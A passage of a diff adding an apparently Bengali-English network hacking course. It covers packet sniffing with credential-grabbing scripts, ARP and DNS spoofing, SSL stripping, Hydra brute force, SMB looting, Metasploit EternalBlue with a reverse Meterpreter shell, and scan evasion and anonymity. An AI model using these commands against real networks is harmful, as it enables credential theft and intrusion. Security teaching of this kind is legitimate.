+<span class="p">$</span> tcpdump -r output.pcap            <span class="c"># File থেকে read</span>
+<span class="p">$</span> tcpdump -i eth0 -n                <span class="c"># DNS resolve না করে</span>
+<span class="p">$</span> tcpdump -i eth0 -v                <span class="c"># Verbose</span>
+<span class="p">$</span> tcpdump -i eth0 -X                <span class="c"># Hex+ASCII dump</span>
+<span class="p">$</span> tcpdump -i eth0 -c 100            <span class="c"># 100 packet capture করে বন্ধ</span>
+
+<span class="c"># BPF Filters</span>
+<span class="p">$</span> tcpdump -i eth0 host 192.168.1.1           <span class="c"># Specific host</span>
+<span class="p">$</span> tcpdump -i eth0 src 192.168.1.100          <span class="c"># Source IP</span>
+<span class="p">$</span> tcpdump -i eth0 dst 8.8.8.8               <span class="c"># Dest IP</span>
+<span class="p">$</span> tcpdump -i eth0 port 80                   <span class="c"># Port 80</span>
+<span class="p">$</span> tcpdump -i eth0 tcp port 443              <span class="c"># TCP port 443</span>
+<span class="p">$</span> tcpdump -i eth0 udp port 53               <span class="c"># DNS</span>
+<span class="p">$</span> tcpdump -i eth0 net 192.168.1.0/24        <span class="c"># Subnet</span>
+<span class="p">$</span> tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' <span class="c"># SYN packets only</span>
+<span class="p">$</span> tcpdump -i eth0 not port 22               <span class="c"># SSH বাদে সব</span>
+<span class="p">$</span> tcpdump -i eth0 port 80 or port 443       <span class="c"># HTTP + HTTPS</span>
+
+<span class="c"># HTTP credentials capture (unencrypted)</span>
+<span class="p">$</span> tcpdump -i eth0 -A port 80 | grep -E "username|password|pass|login"
+
+<span class="c"># Live display + save</span>
+<span class="p">$</span> tcpdump -i eth0 -w - | tee output.pcap | tcpdump -r -</div>
+
+    <h2 class="sec">🐍 <span class="bn-text">Scapy দিয়ে Packet Analysis</span><span class="en-text">Packet Analysis with Scapy</span></h2>
+    <div class="code"><span class="k">from</span> scapy.all <span class="k">import</span> *
+
+<span class="c"># Live sniff করো</span>
+<span class="k">def</span> <span class="fn">packet_handler</span>(pkt):
+    <span class="k">if</span> pkt.haslayer(IP):
+        src = pkt[IP].src
+        dst = pkt[IP].dst
+
+        <span class="c"># HTTP POST → credentials চুরি</span>
+        <span class="k">if</span> pkt.haslayer(TCP) <span class="k">and</span> pkt.haslayer(Raw):
+            payload = pkt[Raw].load.decode(<span class="s">'utf-8'</span>, errors=<span class="s">'ignore'</span>)
+            keywords = [<span class="s">'password'</span>, <span class="s">'passwd'</span>, <span class="s">'user'</span>, <span class="s">'login'</span>, <span class="s">'pwd'</span>]
+            <span class="k">if</span> <span class="fn">any</span>(kw <span class="k">in</span> payload.lower() <span class="k">for</span> kw <span class="k">in</span> keywords):
+                <span class="k">print</span>(<span class="s">f"\n[!] CREDENTIALS from {src}:"</span>)
+                <span class="k">print</span>(payload[:<span class="num">300</span>])
+
+        <span class="c"># DNS queries log</span>
+        <span class="k">if</span> pkt.haslayer(DNS) <span class="k">and</span> pkt[DNS].qr == <span class="num">0</span>:
+            query = pkt[DNS].qd.qname.decode(<span class="s">'utf-8'</span>, errors=<span class="s">'ignore'</span>)
+            <span class="k">print</span>(<span class="s">f"[DNS] {src} → {query}"</span>)
+
+<span class="fn">sniff</span>(iface=<span class="s">"eth0"</span>, prn=<span class="fn">packet_handler</span>, store=<span class="num">0</span>,
+      filter=<span class="s">"tcp port 80 or udp port 53"</span>)
+
+<span class="c"># .pcap file analyze করো</span>
+packets = rdpcap(<span class="s">"capture.pcap"</span>)
+<span class="k">print</span>(<span class="s">f"Total packets: {len(packets)}"</span>)
+
+<span class="c"># HTTP GET requests বের করো</span>
+<span class="k">for</span> pkt <span class="k">in</span> packets:
+    <span class="k">if</span> pkt.haslayer(Raw):
+        payload = pkt[Raw].load.decode(<span class="s">'utf-8'</span>, errors=<span class="s">'ignore'</span>)
+        <span class="k">if</span> <span class="s">'GET '</span> <span class="k">in</span> payload <span class="k">or</span> <span class="s">'POST '</span> <span class="k">in</span> payload:
+            <span class="k">print</span>(<span class="s">f"[HTTP] {payload[:100]}"</span>)</div>
+
+    <h2 class="sec">🔍 <span class="bn-text">Wireshark Forensics — Real Scenarios</span><span class="en-text">Wireshark Forensics — Real Scenarios</span></h2>
+    <div class="code"><span class="c">════ Scenario 1: HTTP Credentials বের করো ════</span>
+<span class="c">Filter: http.request.method == "POST"</span>
+<span class="c">→ Packet → Follow → HTTP Stream</span>
+<span class="c">→ username=admin&password=secret দেখতে পাবে</span>
+
+<span class="c">════ Scenario 2: DNS Exfiltration দেখো ════</span>
+<span class="c">Filter: dns.qry.name contains "suspicious.com"</span>
+<span class="c">→ আসামান্য অনেক DNS query = data exfiltration</span>
+
+<span class="c">════ Scenario 3: Port Scan Detect করো ════</span>
+<span class="c">Filter: tcp.flags.syn == 1 and tcp.flags.ack == 0</span>
+<span class="c">→ একই source থেকে অনেক SYN = port scan</span>
+
+<span class="c">════ Scenario 4: FTP Credentials ════</span>
+<span class="c">Filter: ftp</span>
+<span class="c">→ USER এবং PASS command plaintext-এ দেখাবে</span>
+
+<span class="c">════ Scenario 5: Telnet Session ════</span>
+<span class="c">Filter: telnet</span>
+<span class="c">→ Follow TCP Stream → সব keystrokes দেখবে</span>
+
+<span class="c">════ Useful Wireshark Statistics ════</span>
+<span class="c">Statistics → Protocol Hierarchy     → কোন protocol কতটুকু</span>
+<span class="c">Statistics → Conversations          → কে কার সাথে কথা বলছে</span>
+<span class="c">Statistics → Endpoints              → সব IP/MAC list</span>
+<span class="c">Statistics → IO Graphs              → Traffic graph</span>
+<span class="c">Analyze   → Expert Information      → Errors/warnings</span></div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 5 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">Wireshark display filter জানলে যেকোনো traffic analyze করা যায়</span></li>
+        <li>✔ <span class="bn-text">tcpdump = server-এ headless capture-এর জন্য</span></li>
+        <li>✔ <span class="bn-text">HTTP traffic-এ credentials plaintext-এ দেখা যায়</span></li>
+        <li>✔ <span class="bn-text">DNS queries দিয়ে কার কাছে যাচ্ছে বোঝা যায়</span></li>
+        <li>✔ <span class="bn-text">Scapy দিয়ে custom packet analysis automate করো</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH6: MITM -->
+<div class="chapter ch6">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 06</div>
+    <div class="chapter-title">🎭 <span class="bn-text">MITM — Man-in-the-Middle</span><span class="en-text">MITM — Man-in-the-Middle</span></div>
+    <div class="chapter-desc"><span class="bn-text">ARP Spoofing, DNS Spoofing, SSL Strip, Bettercap দিয়ে MITM</span><span class="en-text">ARP Spoofing, DNS Spoofing, SSL Strip, MITM with Bettercap</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🤔 <span class="bn-text">MITM Attack কীভাবে কাজ করে?</span><span class="en-text">How Does a MITM Attack Work?</span></h2>
+    <p><span class="bn-text">Normal এ: Client → Router → Internet। MITM-এ: Client → Attacker → Router → Internet। Attacker মাঝখানে থেকে সব traffic দেখতে ও পরিবর্তন করতে পারে।</span><span class="en-text">Normally: Client → Router → Internet. With MITM: Client → Attacker → Router → Internet. The attacker in the middle can see and modify all traffic.</span></p>
+
+    <h2 class="sec">🥸 <span class="bn-text">ARP Spoofing — MITM-এর ভিত্তি</span><span class="en-text">ARP Spoofing — Foundation of MITM</span></h2>
+    <div class="code"><span class="c"># arp-spoof দিয়ে (arpspoof package)</span>
+<span class="c"># Terminal 1: IP Forwarding enable করো</span>
+<span class="p">$</span> echo 1 > /proc/sys/net/ipv4/ip_forward
+
+<span class="c"># Terminal 2: Victim-কে বলো "Gateway আমি"</span>
+<span class="p">$</span> arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
+<span class="c">#              ↑interface  ↑victim    ↑gateway</span>
+
+<span class="c"># Terminal 3: Gateway-কে বলো "Victim আমি"</span>
+<span class="p">$</span> arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
+
+<span class="c"># Terminal 4: Victim-এর traffic capture করো</span>
+<span class="p">$</span> wireshark -i eth0 &
+<span class="c"># অথবা</span>
+<span class="p">$</span> tcpdump -i eth0 host 192.168.1.50 -w victim.pcap</div>
+
+    <h2 class="sec">⚡ <span class="bn-text">Bettercap — Modern MITM Framework</span><span class="en-text">Bettercap — Modern MITM Framework</span></h2>
+    <div class="code"><span class="c"># Install</span>
+<span class="p">$</span> apt install bettercap
+<span class="p">$</span> bettercap -h
+
+<span class="c"># Interactive mode</span>
+<span class="p">$</span> bettercap -iface eth0
+
+<span class="c">━━━ Bettercap Commands ━━━</span>
+
+<span class="c"># Network discovery</span>
+bettercap> net.probe on         <span class="c"># Network scan start</span>
+bettercap> net.show             <span class="c"># সব hosts দেখো</span>
+
+<span class="c"># ARP Spoofing</span>
+bettercap> set arp.spoof.targets 192.168.1.50   <span class="c"># Victim IP</span>
+bettercap> arp.spoof on                          <span class="c"># Attack start</span>
+
+<span class="c"># HTTP/HTTPS sniffer</span>
+bettercap> http.proxy on        <span class="c"># HTTP proxy intercept</span>
+bettercap> https.proxy on       <span class="c"># HTTPS (SSL strip)</span>
+
+<span class="c"># Credential sniffer</span>
+bettercap> net.sniff on         <span class="c"># Packet sniffing</span>
+bettercap> set net.sniff.verbose true
+
+<span class="c"># DNS Spoofing</span>
+bettercap> set dns.spoof.domains facebook.com,google.com
+bettercap> set dns.spoof.address 192.168.1.10   <span class="c"># Fake server IP</span>
+bettercap> dns.spoof on
+
+<span class="c"># WiFi reconnaissance</span>
+bettercap> wifi.recon on        <span class="c"># WiFi scan</span>
+bettercap> wifi.show            <span class="c"># Networks দেখো</span>
+bettercap> wifi.deauth AA:BB:CC:DD:EE:FF  <span class="c"># Deauth</span>
+
+<span class="c"># Caplet (automated script)</span>
+<span class="p">$</span> bettercap -iface eth0 -caplet mitm.cap
+
+<span class="c"># mitm.cap file:</span>
+net.probe on
+set arp.spoof.targets 192.168.1.0/24
+arp.spoof on
+net.sniff on
+set net.sniff.regexp ".*password.*"</div>
+
+    <h2 class="sec">🌐 <span class="bn-text">DNS Spoofing</span><span class="en-text">DNS Spoofing</span></h2>
+    <div class="code"><span class="c"># dnsspoof (classic)</span>
+<span class="c"># /etc/dnsspoof.hosts file তৈরি করো:</span>
+<span class="c"># 192.168.1.10  facebook.com</span>
+<span class="c"># 192.168.1.10  *.facebook.com</span>
+<span class="c"># 192.168.1.10  google.com</span>
+
+<span class="p">$</span> dnsspoof -i eth0 -f /etc/dnsspoof.hosts
+
+<span class="c"># Fake web server setup (victim কে fake page দেখাবে)</span>
+<span class="p">$</span> service apache2 start
+<span class="c"># /var/www/html/index.html এ fake login page রাখো</span>
+
+<span class="c"># responder (Windows environments)</span>
+<span class="p">$</span> responder -I eth0 -wFb
+<span class="c"># LLMNR/NBT-NS poisoning → NTLMv2 hash capture করে</span></div>
+
+    <h2 class="sec">🔐 <span class="bn-text">SSL Strip — HTTPS কে HTTP করো</span><span class="en-text">SSL Strip — Downgrade HTTPS to HTTP</span></h2>
+    <div class="code"><span class="c"># sslstrip2 + bettercap</span>
+bettercap> set https.proxy.sslstrip true
+bettercap> https.proxy on
+bettercap> arp.spoof on
+
+<span class="c"># Manual sslstrip</span>
+<span class="p">$</span> echo 1 > /proc/sys/net/ipv4/ip_forward
+<span class="p">$</span> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+<span class="p">$</span> sslstrip -l 8080 -w sslstrip.log &
+<span class="p">$</span> arpspoof -i eth0 -t victim_ip gateway_ip
+
+<span class="c"># Log দেখো</span>
+<span class="p">$</span> tail -f sslstrip.log | grep -i "password\|login\|user"
+
+<span class="c"># Note: Modern browsers-এ HSTS থাকলে SSL Strip কাজ করে না</span>
+<span class="c"># HSTS Preloaded sites: google.com, facebook.com → safe</span></div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 6 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">ARP Spoof = MITM-এর core technique</span></li>
+        <li>✔ <span class="bn-text">Bettercap = সব MITM tool এক জায়গায়</span></li>
+        <li>✔ <span class="bn-text">DNS Spoof = victim-কে fake site-এ নিয়ে যাও</span></li>
+        <li>✔ <span class="bn-text">SSL Strip = HTTPS → HTTP downgrade (HSTS-এ কাজ করে না)</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH7: NETWORK SERVICE ATTACKS -->
+<div class="chapter ch7">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 07</div>
+    <div class="chapter-title">⚔️ <span class="bn-text">Network Service Attacks</span><span class="en-text">Network Service Attacks</span></div>
+    <div class="chapter-desc"><span class="bn-text">FTP, SSH, Telnet, SMB, RDP — সব service-এর attack ও exploitation</span><span class="en-text">FTP, SSH, Telnet, SMB, RDP — attacks and exploitation of all services</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🔑 <span class="bn-text">Hydra — Network Login Bruteforcer</span><span class="en-text">Hydra — Network Login Bruteforcer</span></h2>
+    <div class="code"><span class="c"># SSH brute force</span>
+<span class="p">$</span> hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
+<span class="p">$</span> hydra -L users.txt -P pass.txt ssh://192.168.1.1 -t 4
+
+<span class="c"># FTP brute force</span>
+<span class="p">$</span> hydra -l admin -P pass.txt ftp://192.168.1.1
+<span class="p">$</span> hydra -l anonymous -p "" ftp://192.168.1.1  <span class="c"># Anonymous</span>
+
+<span class="c"># Telnet</span>
+<span class="p">$</span> hydra -l root -P pass.txt telnet://192.168.1.1
+
+<span class="c"># HTTP Form brute force</span>
+<span class="p">$</span> hydra -l admin -P pass.txt 192.168.1.1 http-post-form \
+  "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
+
+<span class="c"># RDP brute force</span>
+<span class="p">$</span> hydra -l administrator -P pass.txt rdp://192.168.1.1
+
+<span class="c"># SMB brute force</span>
+<span class="p">$</span> hydra -l administrator -P pass.txt smb://192.168.1.1
+
+<span class="c"># MySQL</span>
+<span class="p">$</span> hydra -l root -P pass.txt mysql://192.168.1.1
+
+<span class="c"># Options</span>
+<span class="p">$</span> hydra -t 16  <span class="c"># 16 parallel tasks</span>
+<span class="p">$</span> hydra -V     <span class="c"># Verbose (প্রতিটা attempt দেখো)</span>
+<span class="p">$</span> hydra -f     <span class="c"># First found তে থামো</span></div>
+
+    <h2 class="sec">📂 <span class="bn-text">SMB — Windows File Sharing</span><span class="en-text">SMB — Windows File Sharing</span></h2>
+    <div class="code"><span class="c"># SMB enumeration</span>
+<span class="p">$</span> smbclient -L //192.168.1.1 -N            <span class="c"># Anonymous share list</span>
+<span class="p">$</span> smbclient -L //192.168.1.1 -U admin      <span class="c"># With credentials</span>
+<span class="p">$</span> smbmap -H 192.168.1.1                    <span class="c"># Share permissions দেখো</span>
+<span class="p">$</span> smbmap -H 192.168.1.1 -u admin -p pass
+
+<span class="c"># enum4linux — Windows/Samba enumeration</span>
+<span class="p">$</span> enum4linux -a 192.168.1.1                <span class="c"># All info</span>
+<span class="p">$</span> enum4linux -U 192.168.1.1                <span class="c"># Users</span>
+<span class="p">$</span> enum4linux -S 192.168.1.1                <span class="c"># Shares</span>
+<span class="p">$</span> enum4linux -P 192.168.1.1                <span class="c"># Password policy</span>
+
+<span class="c"># SMBclient দিয়ে connect</span>
+<span class="p">$</span> smbclient //192.168.1.1/Share -U admin%password
+smb> ls                 <span class="c"># Files দেখো</span>
+smb> get secret.txt     <span class="c"># File download</span>
+smb> put exploit.exe    <span class="c"># File upload</span>
+smb> cd /               <span class="c"># Directory change</span>
+
+<span class="c"># Nmap SMB scripts</span>
+<span class="p">$</span> nmap --script=smb-vuln-ms17-010 192.168.1.1   <span class="c"># EternalBlue check</span>
+<span class="p">$</span> nmap --script=smb-vuln-ms08-067 192.168.1.1
+<span class="p">$</span> nmap --script=smb-enum-shares 192.168.1.1
+<span class="p">$</span> nmap --script=smb-enum-users 192.168.1.1
+
+<span class="c"># CrackMapExec — Windows network auditing</span>
+<span class="p">$</span> crackmapexec smb 192.168.1.0/24             <span class="c"># Discovery</span>
+<span class="p">$</span> crackmapexec smb 192.168.1.1 -u admin -p pass
+<span class="p">$</span> crackmapexec smb 192.168.1.1 --shares       <span class="c"># Shares</span>
+<span class="p">$</span> crackmapexec smb 192.168.1.1 -u admin -p pass --sam  <span class="c"># SAM dump</span></div>
+
+    <h2 class="sec">🖥️ <span class="bn-text">RDP Attacks</span><span class="en-text">RDP Attacks</span></h2>
+    <div class="code"><span class="c"># RDP scan ও check</span>
+<span class="p">$</span> nmap -p 3389 --script=rdp-vuln-ms12-020 192.168.1.1
+<span class="p">$</span> nmap -p 3389 --script=rdp-enum-encryption 192.168.1.1
+
+<span class="c"># RDP brute force</span>
+<span class="p">$</span> hydra -l administrator -P rockyou.txt rdp://192.168.1.1 -t 1
+<span class="p">$</span> crowbar -b rdp -s 192.168.1.1/32 -u administrator -C pass.txt
+
+<span class="c"># xfreerdp দিয়ে connect</span>
+<span class="p">$</span> xfreerdp /u:administrator /p:password /v:192.168.1.1
+<span class="p">$</span> xfreerdp /u:admin /p:pass /v:192.168.1.1 /cert:ignore</div>
+
+    <h2 class="sec">💻 <span class="bn-text">Metasploit — Exploitation Framework</span><span class="en-text">Metasploit — Exploitation Framework</span></h2>
+    <div class="code"><span class="c"># Metasploit start করো</span>
+<span class="p">$</span> msfdb init          <span class="c"># Database init</span>
+<span class="p">$</span> msfconsole           <span class="c"># Start</span>
+
+<span class="c">━━━ Metasploit Basic Commands ━━━</span>
+msf> help
+msf> search <span class="s">eternalblue</span>       <span class="c"># Module খোঁজো</span>
+msf> use exploit/windows/smb/ms17_010_eternalblue
+msf> show options              <span class="c"># Required options দেখো</span>
+msf> set RHOSTS 192.168.1.50   <span class="c"># Target IP</span>
+msf> set LHOST 192.168.1.100   <span class="c"># আমাদের IP</span>
+msf> set LPORT 4444            <span class="c"># Listen port</span>
+msf> set payload windows/x64/meterpreter/reverse_tcp
+msf> run                       <span class="c"># Execute</span>
+
+<span class="c"># Meterpreter commands (successful exploit এর পরে)</span>
+meterpreter> sysinfo           <span class="c"># System info</span>
+meterpreter> getuid            <span class="c"># Current user</span>
+meterpreter> getsystem         <span class="c"># Privilege escalation</span>
+meterpreter> hashdump          <span class="c"># Password hashes</span>
+meterpreter> shell             <span class="c"># CMD shell</span>
+meterpreter> upload file.exe C:\\Windows\\Temp\\
+meterpreter> download secret.txt /tmp/
+meterpreter> keyscan_start     <span class="c"># Keylogger</span>
+meterpreter> screenshot        <span class="c"># Screenshot</span>
+meterpreter> run post/multi/recon/local_exploit_suggester
+
+<span class="c"># Useful modules</span>
+msf> use auxiliary/scanner/portscan/tcp      <span class="c"># Port scanner</span>
+msf> use auxiliary/scanner/smb/smb_ms17_010 <span class="c"># EternalBlue check</span>
+msf> use auxiliary/scanner/ssh/ssh_login     <span class="c"># SSH brute</span>
+msf> use auxiliary/scanner/ftp/ftp_login     <span class="c"># FTP brute</span>
+msf> use post/windows/gather/credentials/credential_collector</div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 7 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">Hydra দিয়ে SSH/FTP/HTTP/RDP/SMB brute force করো</span></li>
+        <li>✔ <span class="bn-text">SMB = Windows-এর সবচেয়ে ঝুঁকিপূর্ণ service</span></li>
+        <li>✔ <span class="bn-text">Metasploit = exploitation-এর standard tool</span></li>
+        <li>✔ <span class="bn-text">Meterpreter = post-exploitation-এর সেরা shell</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH8: FIREWALL & IDS EVASION -->
+<div class="chapter ch8">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 08</div>
+    <div class="chapter-title">🔥 <span class="bn-text">Firewall ও IDS Evasion</span><span class="en-text">Firewall & IDS Evasion</span></div>
+    <div class="chapter-desc"><span class="bn-text">Firewall bypass techniques, IDS detection evasion, tunneling</span><span class="en-text">Firewall bypass techniques, IDS detection evasion, tunneling</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🔥 <span class="bn-text">iptables — Linux Firewall</span><span class="en-text">iptables — Linux Firewall</span></h2>
+    <div class="code"><span class="c"># Rules দেখো</span>
+<span class="p">$</span> iptables -L -n -v --line-numbers
+
+<span class="c"># Basic rules</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --dport 22 -j ACCEPT     <span class="c"># SSH allow</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --dport 80 -j ACCEPT     <span class="c"># HTTP allow</span>
+<span class="p">$</span> iptables -A INPUT -j DROP                         <span class="c"># Else drop</span>
+<span class="p">$</span> iptables -A INPUT -s 192.168.1.50 -j DROP         <span class="c"># Block IP</span>
+
+<span class="c"># Nmap দিয়ে firewall detect করো</span>
+<span class="p">$</span> nmap -sA 192.168.1.1    <span class="c"># ACK scan → filtered/unfiltered দেখাবে</span>
+<span class="p">$</span> nmap -sW 192.168.1.1    <span class="c"># Window scan</span>
+<span class="p">$</span> nmap --traceroute 192.168.1.1
+
+<span class="c"># Firewall bypass techniques</span>
+<span class="p">$</span> nmap -f 192.168.1.1         <span class="c"># Fragment packets</span>
+<span class="p">$</span> nmap -D RND:10 192.168.1.1  <span class="c"># Decoy scan</span>
+<span class="p">$</span> nmap --source-port 53 target <span class="c"># Source port 53 (DNS)</span>
+<span class="p">$</span> nmap --source-port 80 target <span class="c"># Source port 80 (HTTP)</span>
+<span class="p">$</span> nmap -T1 --scan-delay 5s target <span class="c"># Slow scan</span></div>
+
+    <h2 class="sec">🕳️ <span class="bn-text">Port Tunneling</span><span class="en-text">Port Tunneling</span></h2>
+    <div class="code"><span class="c"># SSH Local Port Forwarding</span>
+<span class="c"># Firewall blocked 3306 (MySQL) — 22 (SSH) open</span>
+<span class="p">$</span> ssh -L 3307:127.0.0.1:3306 user@remote_server
+<span class="c"># এখন localhost:3307 = remote:3306</span>
+<span class="p">$</span> mysql -h 127.0.0.1 -P 3307 -u root -p
+
+<span class="c"># SSH Remote Port Forwarding</span>
+<span class="p">$</span> ssh -R 4444:127.0.0.1:4444 user@remote_server
+<span class="c"># Remote server-এ port 4444 = আমাদের localhost:4444</span>
+
+<span class="c"># SSH Dynamic (SOCKS Proxy)</span>
+<span class="p">$</span> ssh -D 1080 user@remote_server
+<span class="c"># Browser/tool এর SOCKS5 = 127.0.0.1:1080</span>
+
+<span class="c"># Proxychains দিয়ে যেকোনো tool tunnel করো</span>
+<span class="p">$</span> nano /etc/proxychains4.conf
+<span class="c"># [ProxyList]</span>
+<span class="c"># socks5 127.0.0.1 1080</span>
+
+<span class="p">$</span> proxychains nmap -sT -p 80,443 target
+<span class="p">$</span> proxychains curl http://target.com
+<span class="p">$</span> proxychains hydra -l root -P pass.txt ssh://target</div>
+
+    <h2 class="sec">🧅 <span class="bn-text">Tor ও Anonymity</span><span class="en-text">Tor & Anonymity</span></h2>
+    <div class="code"><span class="c"># Tor install ও start</span>
+<span class="p">$</span> apt install tor
+<span class="p">$</span> service tor start
+<span class="p">$</span> service tor status
+
+<span class="c"># Tor SOCKS5 = 127.0.0.1:9050</span>
+<span class="p">$</span> proxychains curl https://check.torproject.org
+
+<span class="c"># torify — Tor দিয়ে run করো</span>
+<span class="p">$</span> torify curl http://target.com
+<span class="p">$</span> torify nmap -sT target
+
+<span class="c"># torghost — সব traffic Tor-এ route করো</span>
+<span class="p">$</span> torghost -s    <span class="c"># Start</span>
+<span class="p">$</span> torghost -x    <span class="c"># Stop</span>
+<span class="p">$</span> torghost -ip   <span class="c"># Current IP দেখো</span>
+
+<span class="c"># MAC address spoof (physical tracking avoid)</span>
+<span class="p">$</span> macchanger -r wlan0        <span class="c"># Random MAC</span>
+<span class="p">$</span> macchanger -m 00:11:22:33:44:55 wlan0  <span class="c"># Custom MAC</span>
+<span class="p">$</span> ip link set wlan0 down
+<span class="p">$</span> macchanger -r wlan0
+<span class="p">$</span> ip link set wlan0 up</div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 8 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">iptables দিয়ে Linux firewall rules manage করো</span></li>
+        <li>✔ <span class="bn-text">Nmap -sA দিয়ে firewall type detect করো</span></li>
+        <li>✔ <span class="bn-text">SSH tunneling = firewall block করা port bypass করো</span></li>
+        <li>✔ <span class="bn-text">Proxychains = যেকোনো tool anonymously চালাও</span></li>
+        <li>✔ <span class="bn-text">macchanger = physical identity hide করো</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH9: VPN & TUNNELING -->
+<div class="chapter ch9">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 09</div>
+    <div class="chapter-title">🔒 <span class="bn-text">VPN ও Tunneling</span><span class="en-text">VPN & Tunneling</span></div>
+    <div class="chapter-desc"><span class="bn-text">OpenVPN, WireGuard, SSH Tunneling, Proxychains — সম্পূর্ণ গাইড</span><span class="en-text">OpenVPN, WireGuard, SSH Tunneling, Proxychains — Complete Guide</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🌐 <span class="bn-text">VPN কীভাবে কাজ করে?</span><span class="en-text">How Does a VPN Work?</span></h2>
+    <p><span class="bn-text">VPN encrypted tunnel তৈরি করে যার মধ্যে দিয়ে traffic যায়। ISP বা network admin traffic দেখতে পায় না। Security testing-এ নিজেকে anonymous রাখতে VPN জানা দরকার।</span><span class="en-text">A VPN creates an encrypted tunnel through which traffic passes. ISPs or network admins cannot see the traffic. Knowing VPNs is necessary for staying anonymous during security testing.</span></p>
+
+    <h2 class="sec">⚡ <span class="bn-text">WireGuard — Modern VPN</span><span class="en-text">WireGuard — Modern VPN</span></h2>
+    <div class="code"><span class="c"># WireGuard install</span>
+<span class="p">$</span> apt install wireguard
+
+<span class="c"># Key pair তৈরি করো</span>
+<span class="p">$</span> wg genkey | tee privatekey | wg pubkey > publickey
+<span class="p">$</span> cat privatekey publickey
+
+<span class="c"># Server config: /etc/wireguard/wg0.conf</span>
+[Interface]
+Address = 10.0.0.1/24
+PrivateKey = &lt;SERVER_PRIVATE_KEY&gt;
+ListenPort = 51820
+PostUp   = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
+
+[Peer]
+PublicKey = &lt;CLIENT_PUBLIC_KEY&gt;
+AllowedIPs = 10.0.0.2/32
+
+<span class="c"># Client config</span>
+[Interface]
+Address = 10.0.0.2/24
+PrivateKey = &lt;CLIENT_PRIVATE_KEY&gt;
+DNS = 8.8.8.8
+
+[Peer]
+PublicKey = &lt;SERVER_PUBLIC_KEY&gt;
+Endpoint = server_ip:51820
+AllowedIPs = 0.0.0.0/0   <span class="c"># All traffic through VPN</span>
+
+<span class="c"># Start/Stop</span>
+<span class="p">$</span> wg-quick up wg0
+<span class="p">$</span> wg-quick down wg0
+<span class="p">$</span> wg show               <span class="c"># Status</span></div>
+
+    <h2 class="sec">🔗 <span class="bn-text">SSH Tunneling — সব কিছুর জন্য</span><span class="en-text">SSH Tunneling — For Everything</span></h2>
+    <div class="code"><span class="c">━━━ SSH TUNNELING CHEATSHEET ━━━</span>
+
+<span class="c"># 1. Local Port Forward (আমার port → remote service)</span>
+<span class="p">$</span> ssh -L local_port:target_host:target_port user@jump_server
+<span class="c"># Example: Remote MySQL access করো</span>
+<span class="p">$</span> ssh -L 3307:192.168.2.5:3306 user@192.168.1.1
+<span class="p">$</span> mysql -h 127.0.0.1 -P 3307  <span class="c"># Now access!</span>
+
+<span class="c"># 2. Remote Port Forward (remote port → আমার service)</span>
+<span class="p">$</span> ssh -R remote_port:local_host:local_port user@remote
+<span class="c"># Example: NAT-এর পেছন থেকে reverse shell</span>
+<span class="p">$</span> ssh -R 4444:localhost:4444 user@my_vps
+
+<span class="c"># 3. Dynamic SOCKS Proxy</span>
+<span class="p">$</span> ssh -D 1080 user@proxy_server
+<span class="c"># SOCKS5 127.0.0.1:1080 → সব traffic route হবে</span>
+
+<span class="c"># 4. Jump Host (Bastion)</span>
+<span class="p">$</span> ssh -J jump_user@jump_host target_user@final_target
+<span class="c"># ~/.ssh/config তে:</span>
+Host final_target
+    ProxyJump jump_user@jump_host
+    User target_user
+
+<span class="c"># 5. Multiple hops</span>
+<span class="p">$</span> ssh -J user1@hop1,user2@hop2 user3@destination
+
+<span class="c"># Background-এ চালাও</span>
+<span class="p">$</span> ssh -fNL 3307:127.0.0.1:3306 user@server  <span class="c"># -f=background, -N=no command</span></div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 9 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">WireGuard = fastest, modern VPN — নিজের VPN server বানাও</span></li>
+        <li>✔ <span class="bn-text">SSH Local Tunnel = blocked port access করো</span></li>
+        <li>✔ <span class="bn-text">SSH Remote Tunnel = NAT থেকে reverse connection</span></li>
+        <li>✔ <span class="bn-text">SSH Dynamic = SOCKS proxy → Proxychains দিয়ে ব্যবহার করো</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH10: NETWORK DEFENSE -->
+<div class="chapter ch10">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 10</div>
+    <div class="chapter-title">🛡️ <span class="bn-text">Network Defense ও Hardening</span><span class="en-text">Network Defense & Hardening</span></div>
+    <div class="chapter-desc"><span class="bn-text">Firewall setup, IDS/IPS, WiFi hardening, Network monitoring — সব defense technique</span><span class="en-text">Firewall setup, IDS/IPS, WiFi hardening, network monitoring — all defense techniques</span></div>
+  </div>
+  <div class="chapter-body">
+
